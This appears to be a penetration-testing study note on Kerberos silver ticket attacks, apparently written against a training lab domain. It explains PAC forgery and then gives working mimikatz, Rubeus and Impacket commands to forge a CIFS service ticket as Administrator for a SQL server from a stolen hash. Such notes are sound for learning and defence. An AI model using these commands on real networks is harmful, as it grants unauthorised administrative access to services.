## What are?
This particular type of attack targets the hash of a *machine object(ex. MACHINE$)* allowing the attacker to forge own service tickets. A **silver ticket attack** is when an attacker forges a **service ticket** (TGS) for a specific service without needing to compromise the domain controller or the entire Kerberos Key Distribution Center (KDC).

## How it works?
When a user requests a TGS ticket, they send their TGT to the Domain Controller. The Domain Controller will find out which account exposes the SPN requested by the user. Then it will copy the user's information (the `PAC`) into the TGS ticket, which it will then encrypt with the secret of the service account associated with the SPN.
The attacker can forge a service ticket from scratch since they can create an arbitrary PAC and encrypt it with the secret stolen. Once this TGS ticket is forged, the attacker presents it to the service. The service can decrypt it because it has been encrypted with its own password, and then it will read the contents of the PAC. As the attacker has forged it, they can embed whatever information they desire, such as being a domain administrator. This forged ticket is called a `Silver Ticket`.

## Key Points of Silver Ticket
- **No Need to Compromise Domain Controller**: Unlike golden ticket attacks, a silver ticket attack doesn't require control over the domain controller but only the service account.
- **Targeted Attack**: It's focused on specific services, so the attacker only has control over the resources tied to the compromised service account.
- **Harder to Detect**: Since this attack doesn’t involve communication with the domain controller, it’s less likely to trigger alerts or logs that are monitored for unauthorized domain activity.

# Attacks
## From Windows
In order to forge a *Silver ticket* we will need the **Domain SID**.
```powershell-session
Import-Module .\PowerView.ps1
Get-DomainSID
S-1-5-21-2974783224-3764228556-2640795941
```
Next we need to compromise either a **ServiceAccount(ex. svc_sql)** or **MachineAccount(ex. SQL01$)**.
In this example we will craft a Silverticket for the service account we found so we can reach the FS at SQL server.
```powershell-session
mimikatz # kerberos::golden /domain:inlanefreight.local /user:Administrator /sid:S-1-5-21-2974783224-3764228556-2640795941 /rc4:ff955e93a130f5bb1a6565f32b7dc127 /target:sql01.inlanefreight.local /service:cifs  /ptt
```
OBS: if we omit the `/ppt` function then the ticket will be saved in a **kirbi** file.
Allowing us to create a sacrificial shell.
```cmd-session
.\Rubeus.exe createnetonly /program:powershell.exe /show
```
And inject the ticket in the sacrificial session.
```cmd-session
.\Rubeus.exe ptt /ticket:sql01.kirbi
```
And take full access over the victim(in this case was the SQL server).

## From Linux
Same can be done from Linux, and same here we start by obtaining the Domain SID.
```shell-session
impacket-lookupsid inlanefreight.local/pixis@dc01.inlanefreight.local -domain-sids
```
Now we want to forge a *SilverTicket* for the user *Administrator* over the machine SQL01 by using the password hash of the machine object **SQL01$**.
```shell-session
impacket-ticketer -nthash ff955e93a130f5bb1a6565f32b7dc127 -domain-sid S-1-5-21-2974783224-3764228556-2640795941 -domain inlanefreight.local -spn cifs/sql01.inlanefreight.local Administrator
```
Point the received *ccache* and take your attacks further.
```shell-session
export KRB5CCNAME=./Administrator.ccache
```